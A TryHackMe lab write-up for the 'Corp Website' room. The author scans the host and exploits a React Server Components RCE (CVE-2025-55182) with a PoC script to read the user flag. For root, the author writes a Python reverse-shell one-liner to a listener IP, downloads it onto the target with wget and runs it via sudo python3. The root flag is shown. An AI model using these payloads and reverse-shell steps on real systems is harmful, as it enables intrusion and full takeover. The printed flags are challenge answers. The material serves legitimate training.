# Corp Website (Done)

Completion Status: Done
Difficulty Level: Medium
Tags: CVE, Web
Type: Challenege
URL: https://tryhackme.com/room/lafb2026e7

https://tryhackme.com/room/lafb2026e7

## Nmap Scan

```bash
┌──(kali㉿Shieldbyte53)-[~]
└─$ nmap  -sS -p- 10.49.163.81 -vvv
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-04 14:48 IST
Initiating Ping Scan at 14:48
Scanning 10.49.163.81 [4 ports]
Completed Ping Scan at 14:48, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:48
Completed Parallel DNS resolution of 1 host. at 14:48, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 14:48
Scanning 10.49.163.81 [65535 ports]
Discovered open port 22/tcp on 10.49.163.81
Discovered open port 3000/tcp on 10.49.163.81
Completed SYN Stealth Scan at 14:48, 8.97s elapsed (65535 total ports)
Nmap scan report for 10.49.163.81
Host is up, received echo-reply ttl 62 (0.011s latency).
Scanned at 2026-03-04 14:48:33 IST for 9s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 62
3000/tcp open  ppp     syn-ack ttl 61

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.13 seconds
           Raw packets sent: 65703 (2.891MB) | Rcvd: 65536 (2.621MB)
```

## Vulnerable to React2Shell

### Successful PoC exploitation

```bash
┌──(kali㉿Shieldbyte53)-[~/Testing/react2shellpoc]
└─$ python3 exploit.py -t http://10.49.163.81:3000/

      /\
     /**\
    /****\
   /******\
  /********\
 /**********\
      ||

    [CVE-2025-55182 React Server Components RCE]

[*] EXPLOITATION PARAMETERS
────────────────────────────────────────────────────────────
  TARGET    : http://10.49.163.81:3000/
  PAYLOAD   : id
────────────────────────────────────────────────────────────

[*] Initiating exploitation sequence...
[*] Establishing connection to target...

[+] EXPLOITATION SUCCESSFUL
────────────────────────────────────────────────────────────
  ▸ uid=100(daniel) gid=101(secgroup) groups=101(secgroup),101(secgroup)
────────────────────────────────────────────────────────────
```

### Getting User Flag

```bash
┌──(kali㉿Shieldbyte53)-[~/Testing/react2shellpoc]
└─$ python3 exploit.py -t http://10.49.163.81:3000/ -c "ls"

      /\
     /**\
    /****\
   /******\
  /********\
 /**********\
      ||

    [CVE-2025-55182 React Server Components RCE]

[*] EXPLOITATION PARAMETERS
────────────────────────────────────────────────────────────
  TARGET    : http://10.49.163.81:3000/
  PAYLOAD   : ls
────────────────────────────────────────────────────────────

[*] Initiating exploitation sequence...
[*] Establishing connection to target...

[+] EXPLOITATION SUCCESSFUL
────────────────────────────────────────────────────────────
  ▸ Dockerfile
  ▸ app
  ▸ components
  ▸ docker-compose.yml
  ▸ exploit.py
  ▸ lib
  ▸ next-env.d.ts
  ▸ next.config.js
  ▸ node_modules
  ▸ package-lock.json
  ▸ package.json
  ▸ postcss.config.js
  ▸ public
  ▸ tailwind.config.js
  ▸ tsconfig.json
────────────────────────────────────────────────────────────

┌──(kali㉿Shieldbyte53)-[~/Testing/react2shellpoc]
└─$ python3 exploit.py -t http://10.49.163.81:3000/ -c "ls /home"

      /\
     /**\
    /****\
   /******\
  /********\
 /**********\
      ||

    [CVE-2025-55182 React Server Components RCE]

[*] EXPLOITATION PARAMETERS
────────────────────────────────────────────────────────────
  TARGET    : http://10.49.163.81:3000/
  PAYLOAD   : ls /home
────────────────────────────────────────────────────────────

[*] Initiating exploitation sequence...
[*] Establishing connection to target...

[+] EXPLOITATION SUCCESSFUL
────────────────────────────────────────────────────────────
  ▸ daniel
  ▸ node
────────────────────────────────────────────────────────────

┌──(kali㉿Shieldbyte53)-[~/Testing/react2shellpoc]
└─$ python3 exploit.py -t http://10.49.163.81:3000/ -c "ls /home/daniel"

      /\
     /**\
    /****\
   /******\
  /********\
 /**********\
      ||

    [CVE-2025-55182 React Server Components RCE]

[*] EXPLOITATION PARAMETERS
────────────────────────────────────────────────────────────
  TARGET    : http://10.49.163.81:3000/
  PAYLOAD   : ls /home/daniel
────────────────────────────────────────────────────────────

[*] Initiating exploitation sequence...
[*] Establishing connection to target...

[+] EXPLOITATION SUCCESSFUL
────────────────────────────────────────────────────────────
  ▸ user.txt
────────────────────────────────────────────────────────────

┌──(kali㉿Shieldbyte53)-[~/Testing/react2shellpoc]
└─$ python3 exploit.py -t http://10.49.163.81:3000/ -c "cat /home/daniel/user.txt"

      /\
     /**\
    /****\
   /******\
  /********\
 /**********\
      ||

    [CVE-2025-55182 React Server Components RCE]

[*] EXPLOITATION PARAMETERS
────────────────────────────────────────────────────────────
  TARGET    : http://10.49.163.81:3000/
  PAYLOAD   : cat /home/daniel/user.txt
────────────────────────────────────────────────────────────

[*] Initiating exploitation sequence...
[*] Establishing connection to target...

[+] EXPLOITATION SUCCESSFUL
────────────────────────────────────────────────────────────
  ▸ THM{R34c7_2_5h311_3xpl017}
────────────────────────────────────────────────────────────

```

### Getting Root Flag

### Checking Sudoers

```bash
┌──(kali㉿Shieldbyte53)-[~/Testing/react2shellpoc]
└─$ python3 exploit.py -t http://10.49.163.81:3000/ -c "sudo -l"

      /\
     /**\
    /****\
   /******\
  /********\
 /**********\
      ||

    [CVE-2025-55182 React Server Components RCE]

[*] EXPLOITATION PARAMETERS
────────────────────────────────────────────────────────────
  TARGET    : http://10.49.163.81:3000/
  PAYLOAD   : sudo -l
────────────────────────────────────────────────────────────

[*] Initiating exploitation sequence...
[*] Establishing connection to target...

[+] EXPLOITATION SUCCESSFUL
────────────────────────────────────────────────────────────
  ▸ Matching Defaults entries for daniel on romance:
  ▸     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
  ▸ Runas and Command-specific defaults for daniel:
  ▸     Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"
  ▸ User daniel may run the following commands on romance:
  ▸     (root) NOPASSWD: /usr/bin/python3
────────────────────────────────────────────────────────────
```

### Getting Reverse Shell

```bash
┌──(kali㉿Shieldbyte53)-[~]
└─$ echo 'import socket,os,pty;s=socket.socket();s.connect(("192.168.158.240",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' > shell.py

┌──(kali㉿Shieldbyte53)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.49.163.81 - - [04/Mar/2026 15:28:52] "GET /shell.py HTTP/1.1" 200 -
10.49.163.81 - - [04/Mar/2026 15:30:07] "GET /shell.py HTTP/1.1" 200 -
10.49.163.81 - - [04/Mar/2026 15:30:25] "GET /shell.py HTTP/1.1" 200 -

nc -lvnp 4444
```

### Downloading Python file in vulnerable Machine

```bash

┌──(kali㉿Shieldbyte53)-[~/Testing/react2shellpoc]
└─$ python3 exploit.py -t http://10.49.163.81:3000/ -c "wget http://192.168.158.240:8000/shell.py -O /tmp/shell.py"

      /\
     /**\
    /****\
   /******\
  /********\
 /**********\
      ||

    [CVE-2025-55182 React Server Components RCE]

[*] EXPLOITATION PARAMETERS
────────────────────────────────────────────────────────────
  TARGET    : http://10.49.163.81:3000/
  PAYLOAD   : wget http://192.168.158.240:8000/shell.py -O /tmp/shell.py
────────────────────────────────────────────────────────────

[*] Initiating exploitation sequence...
[*] Establishing connection to target...

[+] EXPLOITATION SUCCESSFUL
────────────────────────────────────────────────────────────
────────────────────────────────────────────────────────────

┌──(kali㉿Shieldbyte53)-[~/Testing/react2shellpoc]
└─$ python3 exploit.py -t http://10.49.163.81:3000/ -c "sudo python3 /tmp/shell.py"

      /\
     /**\
    /****\
   /******\
  /********\
 /**********\
      ||

    [CVE-2025-55182 React Server Components RCE]

[*] EXPLOITATION PARAMETERS
────────────────────────────────────────────────────────────
  TARGET    : http://10.49.163.81:3000/
  PAYLOAD   : sudo python3 /tmp/shell.py
────────────────────────────────────────────────────────────

[*] Initiating exploitation sequence...
[*] Establishing connection to target...

[X] EXPLOITATION FAILED
────────────────────────────────────────────────────────────
  ▸ CONNECTION TIMEOUT
  ▸ Target did not respond
  ▸ Connection timeout after 15 seconds
────────────────────────────────────────────────────────────

```

### Obtaining Root Flag

```bash
~ # whoami
whoami
root
~ # cd /root
cd /root
~ # ls
ls
root.txt
~ # cat root.txt
cat root.txt
THM{Pr1v_35c_47_175_f1n357}
~ #
```